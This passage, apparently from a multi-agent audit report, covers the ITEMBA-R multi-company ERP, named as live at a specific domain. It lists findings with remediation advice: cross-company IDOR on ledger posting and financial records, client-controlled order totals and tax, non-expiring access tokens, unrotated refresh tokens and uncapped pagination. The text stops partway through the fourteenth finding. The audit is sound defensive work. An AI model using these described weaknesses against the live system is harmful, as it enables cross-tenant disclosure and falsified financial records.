# ITEMBA-R — Deep Codebase Audit: Findings

**System:** ITEMBA-R — Group Digital Governance & Enterprise Management System (live at app.itembagrouptz.com)
**Scope:** Full codebase — NestJS 11 + Prisma 5 backend (267 modules, ~103K LOC) and Next.js 14 frontend (~102K LOC)
**Date:** 2026-05-30
**Method:** Multi-agent static audit — 24 specialized finder agents across security, multi-tenant isolation, financial/accounting correctness, payroll/tax, inventory/sales concurrency, frontend, Prisma schema and API contracts — each finding independently re-verified against the source by an adversarial verifier agent. Only verified, evidence-backed findings are listed.

> Companion document: **AUDIT_FIX_SUGGESTIONS.md** — concrete, minimal, production-safe remediation for every finding below.

## Severity summary

| Severity | Count |
|---|---|
| Critical | 3 |
| High | 43 |
| Medium | 40 |
| Low | 22 |
| Info | 0 |
| **Total** | **108** |

## Executive summary

The ITEMBA-R **security foundation is mature**: argon2 password hashing with constant-time verification to defeat enumeration timing oracles, refresh-token family rotation with reuse detection, session-bound JWTs with per-request revocation checks, strict production env validation (rejects default secrets, forces distinct key material and HTTPS origins), a hardened global `ValidationPipe` (whitelist + forbidNonWhitelisted), CORS that rejects wildcards, Helmet, a global Throttler, a global soft-delete Prisma layer, and an error filter that scrubs secrets and never leaks stack traces to clients.

The risk is **not in the foundation but in its uneven application across 267 feature modules**. The dominant, systemic finding is that tenant isolation is enforced *per-service* (the global `PermissionsGuard` deliberately does no per-record company check — see ITMB finding for `permissions.guard.ts`), and a meaningful number of services apply `CompanyScopeService`/`applyCompanyScopeWhere` on their **list** endpoints but **omit it on `findOne` and id-based mutations** — producing cross-company **IDOR** on single records (read, edit, state transitions, and in several cases **direct posting of journal entries into another company's general ledger**). A second systemic theme is **mass-assignment of server-controlled financial/approval fields** (totals, `paymentStatus`, `approvedById`, `createdById`, `companyId`) accepted verbatim from the client because they are declared DTO members (so whitelist does not strip them) or because the controller uses an untyped `@Body() dto: any` (bypassing validation entirely). The remaining findings cluster around **token longevity** (access tokens minted with no `exp`; persistent refresh tokens never rotated), **financial arithmetic/atomicity** (multi-write operations not wrapped in transactions; balance read-modify-write races; document-number generation races), and assorted **reliability/contract** issues.

**Top risks to the live multi-company financial system:**

1. **Cross-tenant ledger corruption** — intercompany-transactions, depreciation, and loan-repayment posting paths write POSTED journal entries into arbitrary companies' GLs with no access check.
2. **Cross-tenant disclosure** of financial documents (trial balances, financial-statement runs, rent/fuel/credit records) via unscoped `findOne`.
3. **Privilege escalation** via role create/update (a delegated role admin can mint a GROUP-scoped role or attach arbitrary permissions).
4. **Financial-state forgery** via mass-assignment (orders marked PAID with no payment; self-approved contracts/pricing).
5. **Token theft persistence** — non-expiring access tokens + non-rotating refresh tokens disable both layers of token-theft mitigation by default.

## Findings by category

| Category | Count |
|---|---|
| numbering | 8 |
| authn | 6 |
| verticals | 5 |
| accounting-integrity | 4 |
| broken access control / idor | 4 |
| mass-assignment | 3 |
| pricing/tax integrity | 2 |
| payroll-posting | 2 |
| multi-tenant data isolation / idor | 2 |
| missing money movement / accounting integrity | 2 |
| broken access control / multi-tenant isolation | 2 |
| mass-assignment/tenant-isolation | 2 |
| concurrency/correctness | 2 |
| concurrency/race condition | 2 |
| authz | 2 |
| hardening / information disclosure | 2 |
| input-validation | 2 |
| leave-balance | 2 |
| multi-tenant data isolation / idor / broken access control | 1 |
| dos / missing resource limits | 1 |
| broken access control / cross-company write | 1 |
| multi-tenant data isolation / cross-company aggregation leakage | 1 |
| reliability/empty-catch-data-integrity | 1 |
| effective-dating | 1 |
| payroll-correctness | 1 |
| salary-advance | 1 |
| filing-period-off-by-one | 1 |
| ssrf | 1 |
| inventory/pricing integrity | 1 |
| balance integrity / race | 1 |
| mass-assignment/business-logic | 1 |
| input validation | 1 |
| atomicity/concurrency | 1 |
| atomicity/correctness | 1 |
| credit control | 1 |
| broken access control / design | 1 |
| tenant isolation / unbounded query | 1 |
| race / depreciation math | 1 |
| path-traversal | 1 |
| tax-base | 1 |
| correctness | 1 |
| multi-tenant data isolation / financial-record integrity | 1 |
| payment status / balance integrity / race | 1 |
| loan principal/balance integrity | 1 |
| correctness/drift | 1 |
| formula-injection | 1 |
| redos / regex injection | 1 |
| payment status / balance integrity | 1 |
| multi-tenancy / input validation | 1 |
| multi-tenancy | 1 |
| hardening / session management | 1 |
| session management | 1 |
| broken access control / auth enforcement | 1 |
| payment status / race | 1 |
| pricing integrity | 1 |
| concurrency | 1 |
| proration | 1 |
| reliability/financial-correctness | 1 |
| dos / rate limiting | 1 |
| weak crypto / hardening | 1 |
| field-mismatch/missing-include | 1 |
| unhandled-fetch-errors/infinite-spinner | 1 |
| data-display/correctness | 1 |
| hardening / http security headers | 1 |
| dos / unbounded query | 1 |
| balance integrity / missing money movement | 1 |
| tenant isolation | 1 |
| statutory-cap-threshold | 1 |
| valuation | 1 |
| rate-fallback | 1 |
| wrong-unique-scope | 1 |
| csrf / origin validation | 1 |

## Detailed findings


### CRITICAL severity

#### ITMB-001 — Intercompany transactions service has zero company-scoping: cross-company read, write, and GL posting

- **Severity:** critical  •  **Confidence:** high  •  **Category:** Multi-tenant data isolation / IDOR / broken access control
- **Location:** `backend/src/modules/intercompany-transactions/intercompany-transactions.service.ts:29`

**What & why:** IntercompanyTransactionsService injects no CompanyScopeService (constructor lines 20-27: prisma, auditLogs, accountingControl, accountResolver, codes, postingEngine) and performs no caller-to-company access checks anywhere. findAll(query) (line 29) takes no AuthUser; its where clause is only { deletedAt: null } plus caller-supplied fromCompanyId/toCompanyId/status/type filters (lines 33-37), so any user with intercompany.view lists EVERY intercompany transaction across EVERY company in the group. findOne(id) (line 57) loads any record by id with no access assertion (controller passes no user). create(dto, userId) (line 71) writes a row with attacker-chosen fromCompanyId/toCompanyId. update/submit/approve/reject/remove only re-fetch via the unscoped findOne. Most severe: post(id, userId) (line 205) resolves chart-of-account roles for existing.fromCompanyId and existing.toCompanyId and writes balanced POSTED JournalEntries into BOTH companies (lines 249-299) with no verification the caller may act on either company. The controller passes no user to findAll/findOne and only user.id (not the AuthUser) to the rest.

**Evidence:** Constructor lines 20-27 (no CompanyScopeService). findAll line 29 (no user); line 33 where = { deletedAt: null }. findOne line 57 (no access check). create line 71 writes dto.fromCompanyId/dto.toCompanyId unchecked. post line 205 -> postLines into existing.fromCompanyId (lines 249-273) and existing.toCompanyId (lines 275-299), status POSTED, with no assertCanAccessCompany. Controller intercompany-transactions.controller.ts:26 return this.service.findAll(query); :32 findOne(id); :38/:48/... pass only user.id.

**Impact:** Full cross-tenant breach of the AR/AP intercompany ledger. A user scoped to one company (with intercompany.view) can enumerate and read every other company's intercompany transactions (amounts, counterparties, descriptions). With intercompany.manage they can create transactions implicating companies they cannot access; with intercompany.post they can write real POSTED journal entries (DR Intercompany Receivable / CR Cash on one side, DR Cash / CR Intercompany Payable on the other) into arbitrary companies' general ledgers, corrupting trial balances and AR/AP/cash positions.

**Fix (summary):** Inject CompanyScopeService and pass the full AuthUser from the controller to every method. In findAll, accept the user and constrain results to accessible companies (e.g. where.OR = [{ fromCompanyId: { in: accessibleIds } }, { toCompanyId: { in: accessibleIds } }] using the same accessible-company resolution that companyWhereFor uses; group admins keep full access). When an explicit from/toCompanyId filter is supplied, assertCanAccessCompany on it. In findOne, after loading, assert the caller can access at least one side (fromCompanyId OR toCompanyId). In create/update assert WRITE access to BOTH fromCompanyId and toCompanyId; in post assert WRITE/MANAGE access to BOTH companies before resolving accounts and posting. Mirror the correct pattern already used in customer-statements.service / supplier-statements.service.

---

#### ITMB-002 — Restaurant order subtotal, taxAmount, totalAmount, paidAmount/outstanding and paymentStatus are accepted from the client and stored with no server-side computation

- **Severity:** critical  •  **Confidence:** high  •  **Category:** Pricing/Tax integrity
- **Location:** `backend/src/modules/restaurant-orders/restaurant-orders.service.ts:14`

**What & why:** create() spreads the DTO straight into the row: const { lines, ...orderData } = dto; tx.restaurantOrder.create({ data: { ...orderData, orderDate } }) (lines 14-24) and inserts lines via { ...line, restaurantOrderId } spread (lines 26-31). CreateRestaurantOrderDto exposes @IsOptional() client-supplied subtotal, taxAmount, totalAmount, paidAmount, outstandingAmount, paymentStatus (dto lines 11-33) and an untyped lines: any[] with no @ValidateNested/@Type, so each line's lineTotal and any field flow through the global whitelist ValidationPipe unstripped. There is no recompute-from-line-items anywhere in the service; update() (lines 59-68) likewise spreads ...orderData. The persisted bill total, paid/outstanding amounts, and paymentStatus are whatever the client sends, independent of the line items.

**Evidence:** service lines 14-31 const { lines, ...orderData } = dto; data: { ...orderData ... }; lines.map((line) => ({ ...line, restaurantOrderId })); dto lines 11-33 optional subtotal/taxAmount/totalAmount/paidAmount/outstandingAmount/paymentStatus; dto line 35-36 untyped @IsArray() lines: any[].

**Impact:** A user with restaurant_orders.create can post a restaurant order whose totalAmount/taxAmount is far below menu-item price x quantity (understating revenue and VAT) and mark it paymentStatus PAID for an arbitrary amount. Direct revenue leakage and tax misstatement in production hospitality operations.

**Fix (summary):** Remove subtotal/taxAmount/totalAmount/paidAmount/outstandingAmount/lineTotal from the create/update DTOs and compute them server-side: load each menuItem price, lineTotal = qty*price, subtotal = sum, tax from the configured rate, totalAmount = subtotal+tax; derive paymentStatus from recorded payments. Type the lines array with @ValidateNested + @Type so unknown fields are stripped.

---

#### ITMB-003 — Sales order line tax, discount and totals are taken verbatim from the client and persisted with no server-side recomputation (VAT under-reporting / receivable manipulation)

- **Severity:** critical  •  **Confidence:** high  •  **Category:** Pricing/Tax integrity
- **Location:** `backend/src/modules/sales-orders/sales-orders.service.ts:45`

**What & why:** computeTotals() (lines 45-60) derives every monetary value from the raw DTO line fields: discount = Number(line.discountAmount ?? 0), tax = Number(line.taxAmount ?? 0), subtotal += qty*price, totalTax += tax, totalDiscount += discount, totalAmount = subtotal - totalDiscount + totalTax. These results are written verbatim into the SalesOrder in create() (lines 77-81: subtotal/discountAmount/taxAmount/totalAmount/outstandingAmount) and update() (lines 145-159). No product tax-rate lookup or discount policy is enforced at write time. TaxAutoApplyService.applyForSalesOrder() (tax-auto-apply.service.ts lines 6-27) runs only inside confirm() and, per its own comment, merely mirrors the already-stored line taxAmount into the TaxTransaction ledger ('Does not recompute tax'). The client therefore wholly controls taxAmount, discountAmount, the totalAmount that becomes the receivable/outstanding, and the VAT figure reported to TRA.

**Evidence:** computeTotals() lines 50-56 read line.discountAmount/line.taxAmount; create() lines 77-81 write subtotal/discountAmount: totalDiscount/taxAmount: totalTax/totalAmount/outstandingAmount: totalAmount directly; tax-auto-apply.service.ts line 16 totalTax += Number(line.taxAmount ?? 0).

**Impact:** A holder of sales.create can submit taxAmount:0 to systematically under-report output VAT, or an arbitrary discountAmount to understate the receivable and cash booked at confirm. AR and the OUTPUT TaxTransaction ledger are directly falsifiable in a live production ERP.

**Fix (summary):** Compute tax server-side from the product/tax configuration during create() and update() and ignore client-supplied taxAmount; validate discountAmount against a max-discount policy and clamp to 0..(qty*unitPrice). Persist only server-computed taxAmount/discountAmount/lineTotal/subtotal/totalAmount. Have TaxAutoApply derive tax from the authoritative rate rather than mirroring the stored value.

---


### HIGH severity

#### ITMB-004 — Audit-adjustment posting uses JS float math with a 0.01 tolerance, allowing an unbalanced journal entry to be posted to the ledger

- **Severity:** high  •  **Confidence:** high  •  **Category:** accounting-integrity
- **Location:** `backend/src/modules/audit-adjustments/audit-adjustments.service.ts:157`

**What & why:** AuditAdjustmentsService.post() balances with floating-point reduce and a tolerance instead of the strict integer-cent equality used everywhere else. Lines 154-159: `const totalDebit = existing.lines.reduce((s, l) => s + Number(l.debit), 0); const totalCredit = existing.lines.reduce((s, l) => s + Number(l.credit), 0); if (Math.abs(totalDebit - totalCredit) > 0.01) throw new BadRequestException('Adjustment is not balanced');`. The same float totals are recomputed (lines 172-173) and persisted onto the JournalEntry (totalDebit2/totalCredit2 at lines 183-184) and the per-line debit/credit are copied straight from the stored Decimals; the JE is written with status:'POSTED' (line 182). create() has the identical weak check at lines 38-40. By contrast JournalEntriesService.validateLines (journal-entries.service.ts:27-44) sums in integer cents via Math.round(value*100) and requires totalDebitCents === totalCreditCents exactly. Confirmed: the canonical strict path exists and this module deliberately diverges from it.

**Impact:** An auditor-booked adjustment whose debit/credit totals differ by up to 0.99 (rounding from upstream, manual entry, or accumulation across many lines) is accepted and posted as status:'POSTED'. The trial balance no longer foots for that JE, and any report aggregating POSTED journal lines inherits the imbalance. Audit adjustments are exactly the entries auditors scrutinize, so a non-footing ledger entry here is materially damaging and there is no later strict re-validation to catch it.

**Fix (summary):** Replace the float tolerance with the strict integer-cent check used by JournalEntriesService.validateLines: convert each line via Math.round((line.debit ?? 0) * 100) / Math.round((line.credit ?? 0) * 100), require the integer-cent debit sum to equal the integer-cent credit sum EXACTLY (drop the 0.01 tolerance), reject negative amounts, and derive the persisted totalDebit/totalCredit from those cents (cents/100). Apply the same to create() (lines 38-40). Keep the existing $transaction; just swap the validation/total derivation so this path matches the rest of the GL.

---

#### ITMB-005 — Access tokens are minted with no exp claim (JWT_ACCESS_EXPIRES_IN defaults to 'never', and production sets 'never') — a leaked access token is valid until the bound ActiveSession is manually revoked

- **Severity:** high  •  **Confidence:** high  •  **Category:** authn
- **Location:** `backend/src/modules/auth/auth.module.ts:42`

**What & why:** The JwtModule access-token factory reads JWT_ACCESS_EXPIRES_IN with default 'never' (auth.module.ts:42); isNonExpiringJwtDuration('never') is true (lines 20-21) so signOptions becomes {} (lines 45-47) — no exp claim is added. env.validation.ts:57 confirms the default is 'never', and the live deployment uses it: .env.production.example:16 and docker-compose.production.yml:94 both set JWT_ACCESS_EXPIRES_IN to 'never'. AuthService.issueTokens signs with this.jwt.signAsync(payload) and no per-call expiry (auth.service.ts:508-509); the persistent-refresh branch re-signs with the same defaults (auth.service.ts:406-411). jwt.strategy ignoreExpiration:false is moot when no exp is present. The only revocation backstop is the per-request sid->ActiveSession ACTIVE check; access tokens that carry a sid are bounded by session revocation, but tokens minted without sid (legacy path, documented at auth.service.ts:26-32) are accepted indefinitely with no time bound at all.

**Evidence:** auth.module.ts:42 const accessExpiresIn = cfg.get('JWT_ACCESS_EXPIRES_IN','never'); lines 45-47 signOptions: isNonExpiringJwtDuration(accessExpiresIn) ? {} : {...}. env.validation.ts:57 JWT_ACCESS_EXPIRES_IN='never'. .env.production.example:16 / docker-compose.production.yml:94 JWT_ACCESS_EXPIRES_IN=never. auth.service.ts:508-509 and 406-411 sign access tokens with no expiresIn.

**Impact:** A leaked/stolen access token (XSS exfiltration, copied Authorization header, proxy/log capture, shared device) has no time-based expiry. For sid-bearing tokens the compromise persists until an admin flips the exact ActiveSession row to REVOKED; for legacy sid-less tokens it persists forever. On a live multi-company ERP holding financial/payroll/HR data this maximizes the value and lifetime of any single token leak.

**Fix (summary):** Always set a short, explicit access-token TTL independent of the refresh/session policy. Pass an explicit expiresIn (e.g. '15m') on the access-token signAsync calls in auth.service.ts (the issueTokens sign at line 509 and the persistent-refresh re-sign at lines 407-411), or change auth.module.ts to default JWT_ACCESS_EXPIRES_IN to '15m' AND reject 'never' specifically for the access token. Set JWT_ACCESS_EXPIRES_IN=15m in the production/staging env to take effect on the live system. Keep long-lived sessions via the refresh token if desired; the access token must always carry exp. Verify the frontend silent-refresh timer (already 14m per docs/audit-report-2026-05-01.md H-27) matches the new TTL before deploying.

---

#### ITMB-006 — Persistent refresh tokens are never rotated and reuse detection is disabled by default — refresh-token theft is undetectable

- **Severity:** high  •  **Confidence:** high  •  **Category:** authn
- **Location:** `backend/src/modules/auth/auth.service.ts:333`

**What & why:** refresh() computes persistentRefresh = isNonExpiringDuration(getRefreshExpiresIn()), TRUE by default because DEFAULT_REFRESH_EXPIRES_IN='never' (auth.service.ts:69, 333, 570-576) and the live deployment leaves it unset/never (env.validation.ts:65). In persistent mode: (a) reuse/replay detection is skipped — gated on !persistentRefresh (line 348), so a previously-seen revoked token is never flagged and the family is never killed; (b) rotation-on-use is skipped — also gated on !persistentRefresh (line 369); (c) the SAME raw refresh token is returned unchanged: return { accessToken, refreshToken: rawToken, tokenType: 'Bearer' } (line 412). refreshExpiresAt for these is 9999-12-31 (lines 70, 578-582). A single long-lived refresh secret is reused for the entire session with no rotation and no theft alarm.

**Evidence:** auth.service.ts:333 persistentRefresh = isNonExpiringDuration(getRefreshExpiresIn()); line 348 if (!persistentRefresh && matched.revokedAt ...); line 369 if (!persistentRefresh && !matched.revokedAt); line 412 returns refreshToken: rawToken. Defaults line 69 DEFAULT_REFRESH_EXPIRES_IN='never'; line 70 PERSISTENT_SESSION_EXPIRES_AT=9999-12-31.

**Impact:** If a refresh token is captured, attacker and victim can both mint fresh access tokens indefinitely with zero detection — the family-kill reuse-detection logic (lines 348-366) meant to catch stolen refresh tokens is inert in the default/production configuration. Combined with finding #1 (non-expiring access tokens), both layers of token-theft mitigation are disabled on the live system.

**Fix (summary):** Decouple 'long-lived' from 'non-rotating'. Rotate the refresh token on every successful refresh even for long-lived sessions: in the persistentRefresh branch (auth.service.ts:406-412) issue a NEW refresh token (route through issueTokens with the existing familyId/sid instead of returning rawToken), mark the consumed row revokedReason='ROTATION', and keep reuse detection active by treating a non-ROTATION revoked token as replay regardless of persistence. A long expiry is acceptable; never returning a new token and never detecting replay is the hole. Roll out carefully: ensure the rotation grace window (REFRESH_TOKEN_ROTATION_GRACE_MS, line 68) covers concurrent in-flight refreshes so legitimate parallel requests are not logged out.

---

#### ITMB-007 — List query DTOs (e.g. chart-of-accounts) lack @Max on limit/page; value forwarded straight to Prisma take with relation includes

- **Severity:** high  •  **Confidence:** high  •  **Category:** DoS / Missing resource limits
- **Location:** `backend/src/modules/chart-of-accounts/dto/query-chart-of-account.dto.ts:13`

**What & why:** QueryChartOfAccountDto declares `@IsOptional() @Type(()=>Number) @IsInt() @Min(1) limit?: number = 20;` (L13) and a similarly uncapped `page` (L12) with NO `@Max`. chart-of-accounts.service.ts L68 forwards the value directly as `take: limit` on a findMany that pulls company/division/branch relation `include`s (L61-65). A request like GET /chart-of-accounts?limit=100000000 therefore makes Postgres return up to that many fully-joined rows in a single response, materialized in Node heap and JSON-serialized on the event loop. This is a systemic pattern: many module query DTOs declare `limit` without `@Max` and pass it straight to `take` instead of routing through the existing clamping helper `common/utils/pagination.ts` (which caps via Math.min(rawLimit,maxLimit)) or the capped `common/dto/pagination-query.dto.ts` (@Max(200)). Verified concrete instances: chart-of-accounts. NOTE: the original 'only 4 @Max occurrences / 56 of 58 uncapped' count is inaccurate — @Max(200) caps do exist in common/dto/pagination.dto.ts, common/dto/pagination-query.dto.ts, fuel-shift-collections and document-number-sequences DTOs — but the chart-of-accounts-style uncapped DTOs are real and exploitable.

**Evidence:** query-chart-of-account.dto.ts L12-13: `@Min(1) page?: number = 1;` / `@Min(1) limit?: number = 20;` (no @Max). chart-of-accounts.service.ts L58-69 findMany with company/division/branch `include` and `take: limit`. common/utils/pagination.ts L17 `const limit = Math.min(rawLimit, maxLimit)` shows the available clamp.

**Impact:** Any authenticated user with read access to such a list endpoint can request an arbitrarily large page and turn a paginated endpoint into a near-whole-table dump (with relation joins). The result set is fully buffered in Node memory and JSON-serialized in one pass, causing heap spikes/OOM and multi-second event-loop blocking that stalls all tenants sharing the worker, plus Prisma-pool/Postgres CPU pressure. The 100 req/min global throttler does not bound per-request row count.

**Fix (summary):** Add `@Max(100)` (or `@Max(200)` to match the existing helper) to the `limit` field of chart-of-accounts and other uncapped query DTOs, OR have the services run page/limit through the existing `pagination({ page, limit, maxLimit: 100 })` helper before using `take`. Safe to apply: clamping only reduces oversized requests; well-behaved clients (default limit=20) are unaffected. Optionally add a lint rule forbidding a `limit` DTO field without `@Max` and `take: limit` without a clamp.

---

#### ITMB-008 — Construction labour reclass allocates the employee's ENTIRE gross to projects even for partial project time

- **Severity:** high  •  **Confidence:** high  •  **Category:** payroll-posting
- **Location:** `backend/src/modules/construction-labour-cost/construction-labour-cost.service.ts:109`

**What & why:** allocateForRun() collects only CONSTRUCTION_PROJECT EmployeeAssignment overlap days into `overlaps` and computes `totalOverlapDays = sum(overlaps)` (line 90). The per-project fraction is `const fraction = days / totalOverlapDays;` (line 109), so the fractions always sum to 1.0 and 100% of the employee's gross (plus employer statutory) is reclassified to projects whenever the employee has ANY project assignment in the period, even if they worked only part of the period on projects and otherwise did corporate/non-project work. There is no division by the employee's total paid/available days.

**Evidence:** construction-labour-cost.service.ts:90 `const totalOverlapDays = Array.from(overlaps.values()).reduce((s, d) => s + d, 0);`; :100 `const gross = Number(entry.grossPay);`; :101 `const grossPlusEr = gross + employerStatutory;`; :109 `const fraction = days / totalOverlapDays;`

**Impact:** postLabourReclass() debits Direct Project Labour Cost (5100) and credits Salaries Expense (6000) for sum(allocatedTotalCost). Over-allocation pushes more salary into project/WIP costing than the employee actually spent, overstating project cost / construction WIP and understating general salaries expense. Project profitability and any progress/cost-plus billing derived from ProjectCostAllocation are inflated.

**Fix (summary):** Divide project overlap days by the employee's total available/paid days for the period (standard working days or actual attendance days), not by the sum of project-only days, so non-project time stays in general salaries: allocate grossPlusEr * (projectDays / totalAvailableDays).

---

#### ITMB-009 — Depreciation schedule findOne has no company-scope check (IDOR)

- **Severity:** high  •  **Confidence:** high  •  **Category:** Multi-tenant data isolation / IDOR
- **Location:** `backend/src/modules/depreciation/depreciation.service.ts:54`

**What & why:** DepreciationService.findOne(id) (line 54) does findFirst({ where: { id, deletedAt: null } }) and returns the schedule with no company-access verification; the controller (depreciation.controller.ts:18) passes no user. findAll IS scoped via applyCompanyScopeWhere (line 40), but findOne is not, and findOne is reused by addEntry (line 84) and generateEntries (line 110), so those inherit the gap.

**Evidence:** depreciation.service.ts:54-60 findOne returns findFirst({ where: { id, deletedAt: null } }) with no check; findAll line 40 uses applyCompanyScopeWhere; addEntry line 84 and generateEntries line 110 call await this.findOne(...). Controller :18 findOne(@Param('id') id: string) { return this.service.findOne(id); }

**Impact:** Any user with depreciation.view can read any company's depreciation schedule (asset, cost basis, accumulated depreciation, method, useful life) by id regardless of tenant. Cross-company disclosure of fixed-asset financial data, and the unscoped findOne is the access gate reused by the mutating addEntry/generateEntries paths.

**Fix (summary):** Add an AuthUser parameter to findOne and assert this.companyScope.assertCanAccessCompany(user, item.companyId) (with WRITE for the addEntry/generateEntries callers) before returning; inject CompanyScopeService; have the controller pass @CurrentUser() user.

---

#### ITMB-010 — Depreciation create/addEntry/generateEntries/postEntry never verify caller access to the target company

- **Severity:** high  •  **Confidence:** high  •  **Category:** Broken access control / cross-company write
- **Location:** `backend/src/modules/depreciation/depreciation.service.ts:62`

**What & why:** No CompanyScopeService is injected (constructor lines 28-34). create(dto, user) (line 62) writes a DepreciationSchedule with data: { ...dto, createdById: user.id } — companyId comes straight from the request body and is never validated. addEntry (line 83) only calls the unscoped findOne. generateEntries (line 102) resolves company from the schedule. Most severe: postEntry(id, user) (line 187) loads any DepreciationEntry by id, resolves DEPRECIATION_EXPENSE / ACCUMULATED_DEPRECIATION on entry.depreciationSchedule.companyId, and writes a balanced POSTED journal entry (DR Depreciation Expense / CR Accumulated Depreciation, lines 218-246) into that company's ledger and increments the schedule's accumulatedDepreciation (line 249), with no assertCanAccessCompany on any path.

**Evidence:** depreciation.service.ts:28-34 constructor (no CompanyScopeService); :63-64 data: { ...dto, createdById: user.id }; :187 postEntry loads entry by id with no scope; :201-246 postLines into entry.depreciationSchedule.companyId with no assertCanAccessCompany; :249-254 increments schedule.accumulatedDepreciation. Controller :24 create, :36 addEntry, :47 generateEntries, :52 postEntry pass user but no scope is enforced.

**Impact:** A user with depreciation.create can create schedules and entries under any company by supplying its companyId, and a user with depreciation.post_entry can post real journal entries into the general ledger of a company they have no access to, corrupting that company's depreciation expense and accumulated-depreciation balances. Cross-tenant write and ledger corruption.

**Fix (summary):** Inject CompanyScopeService. In create, assert assertCanAccessCompany(user, dto.companyId, AccessLevel.WRITE) and stop spreading untrusted ...dto for scope fields (set companyId/fixedAssetId explicitly). In addEntry/generateEntries, route through a findOne that asserts WRITE access to the schedule's companyId. In postEntry, after loading the entry, assert WRITE/MANAGE access to entry.depreciationSchedule.companyId before resolving accounts and posting.

---

#### ITMB-011 — Financial statement run findOne has no company-scope check (IDOR exposing another company's trial balance)

- **Severity:** high  •  **Confidence:** high  •  **Category:** Multi-tenant data isolation / IDOR
- **Location:** `backend/src/modules/financial-statements/financial-statements.service.ts:25`

**What & why:** FinancialStatementsService.findOne(id) (line 25) does findFirst({ where: { id } }) and returns the run directly with no assertCanAccessCompany; the controller (financial-statements.controller.ts:18) passes no user. Each run's resultSummary stores the full per-account trial balance (accountCode, accountName, debit, credit) computed in generate (lines 49-59). findAll IS correctly scoped via applyCompanyScopeWhere (line 17), which makes findOne the leak: anyone who learns or guesses a run id reads another company's complete trial balance.

**Evidence:** financial-statements.service.ts:25-29 findOne returns findFirst({ where: { id } }) with no check; findAll line 17 uses applyCompanyScopeWhere. Controller :18 findOne(@Param('id') id: string) { return this.service.findOne(id); }

**Impact:** Any user with financial_statements.view can retrieve the full trial balance of a financial statement run belonging to a company they cannot access by supplying its id. Direct cross-tenant disclosure of sensitive GL totals.

**Fix (summary):** Change findOne(id) to findOne(id, user: AuthUser): load the run, then await this.companyScope.assertCanAccessCompany(user, item.companyId) before returning (inject CompanyScopeService, mirroring customer-statements.service.ts findOne). Update the controller to pass @CurrentUser() user. Guard against item.companyId being null for legacy group-level runs.

---

#### ITMB-012 — Financial statement generation does not verify access to the requested company

- **Severity:** high  •  **Confidence:** high  •  **Category:** Multi-tenant data isolation / cross-company aggregation leakage
- **Location:** `backend/src/modules/financial-statements/financial-statements.service.ts:31`

**What & why:** generate(dto, user) (line 31) reads companyId from the request body and immediately queries journalEntryLine filtered only by journalEntry.companyId === companyId (lines 35-47), with no assertCanAccessCompany(user, companyId). It returns the computed per-account trial balance (line 76) and persists a FinancialStatementRun under that companyId. No CompanyScopeService is injected. The sibling customer-statements/supplier-statements generate methods correctly call assertCanAccessCompany(user, companyId, WRITE) first.

**Evidence:** financial-statements.service.ts:31 generate destructures companyId from dto; :35-47 journalEntryLine.findMany filtered only by journalEntry.companyId with no access assertion; :61-73 creates run under companyId.

**Impact:** Any user with financial_statements.generate can produce and read the complete trial balance of ANY company by passing that company's id in the body, fully bypassing tenant isolation, and can persist an attacker-triggered run under the victim company.

**Fix (summary):** Inject CompanyScopeService and add await this.companyScope.assertCanAccessCompany(user, companyId, AccessLevel.WRITE) as the first statement in generate, rejecting requests with no companyId for non-group users (mirror customer-statements.service.ts:44).

---

#### ITMB-013 — Fixed-asset disposal posts no journal entry (asset cost & accumulated depreciation never removed; proceeds/gain-loss unrecorded)

- **Severity:** high  •  **Confidence:** high  •  **Category:** missing money movement / accounting integrity
- **Location:** `backend/src/modules/fixed-assets/fixed-assets.service.ts:236`

**What & why:** dispose() (method at line 236) only updates the FixedAsset row (status -> DISPOSED, disposalDate, disposalValue, notes) at lines 243-251 and writes an audit log at lines 253-262. It never posts a journal entry, even though PostingEngineService is injected and the sibling capitalize() method (lines 266-329) posts the acquisition entry via postingEngine.postLines (lines 305-318) and persists journalEntryId (line 324). On disposal the GL still carries the asset at original cost via the FIXED_ASSET account, the ACCUMULATED_DEPRECIATION contra balance (asset.accumulatedDepreciation exists in schema) is never cleared, the cash/bank or receivable for disposal proceeds (dto.disposalValue) is never debited, and any gain/loss on disposal is never recognized in P&L. The capitalization JE created by capitalize() is also never reversed/cleared.

**Evidence:** Lines 243-262: dispose() body is a single prisma.fixedAsset.update({...}) plus audit.log(...); no postingEngine.postLines call, unlike capitalize() which calls postingEngine.postLines at lines 305-318 and sets journalEntryId at line 324. Schema model FixedAsset (schema.prisma:1234) has accumulatedDepreciation, acquisitionCost, disposalValue and journalEntryId fields.

**Impact:** Every disposed/sold/written-off fixed asset permanently overstates the balance sheet (original cost + accumulated depreciation remain) and omits the cash received and the gain/loss, misstating both balance sheet and income statement. The trial balance and fixed-asset register diverge from reality for all disposals.

**Fix (summary):** Inside a $transaction in dispose(), resolve FIXED_ASSET, ACCUMULATED_DEPRECIATION, a Cash/Bank or AR account (per disposal type), and a Gain/Loss-on-Disposal account; post a balanced entry: DR Accumulated Depreciation (to-date) + DR Cash/AR (proceeds = dto.disposalValue) + DR/CR Gain or Loss for the residual, CR Fixed Asset (original acquisitionCost). Persist the resulting journalEntryId on the asset, mirroring capitalize() (lines 305-326). Guard against double-posting by checking for an existing disposal JE as capitalize() does at lines 273-283.

---

#### ITMB-014 — IDOR + cross-company list leakage: Fuel Credit Sales not company-scoped

- **Severity:** high  •  **Confidence:** high  •  **Category:** Broken Access Control / Multi-tenant isolation
- **Location:** `backend/src/modules/fuel-credit-sales/fuel-credit-sales.service.ts:91`

**What & why:** FuelCreditSalesService does not inject CompanyScopeService. findAll (85-111) builds where with `if (query.companyId) where.companyId = query.companyId` (line 91) — when the client omits companyId the query returns every company's credit sales. findOne(id, user) at 113-133 runs findFirst({ where: { id, deletedAt: null } }) with no company assertion (it even writes a FUEL_CREDIT_SALE_VIEW audit at 124 without authorizing). update (135), markInvoiced (172), cancel (197) and softDelete (226) each re-fetch by raw id with only a status check and no company assertion before mutating.

**Evidence:** fuel-credit-sales.service.ts:90-91 where={deletedAt:null}; if(query.companyId) where.companyId=query.companyId; :114-122 findOne findFirst({ where:{ id, deletedAt:null } }) with VIEW audit but no assert; mutations at :136,:173,:198,:227 findFirst by id with status-only guard.

**Impact:** Any authenticated petroleum user can (a) list every company's fuel credit sales — exposing customer credit balances, volumes, prices and revenue — by calling the endpoint without companyId, and (b) read/update/markInvoiced/cancel/softDelete any single credit sale across companies by id. Cross-tenant leakage of receivable data plus integrity loss.

